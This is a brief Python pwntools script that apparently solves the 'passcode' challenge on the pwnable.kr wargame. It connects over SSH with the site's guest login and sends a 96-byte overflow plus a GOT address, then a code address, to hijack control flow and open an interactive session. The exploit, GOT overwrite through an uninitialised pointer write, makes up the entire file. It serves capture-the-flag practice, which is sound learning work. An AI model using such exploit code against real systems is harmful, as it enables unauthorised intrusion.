from pwn import *

c = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)

process = c.process('./passcode')
payload = b'A' * 96 + p32(0x804a004)
process.sendline(payload)

payload2 =  str(int(0x080485e3))
process.sendline(payload2)

process.interactive()

c.close()
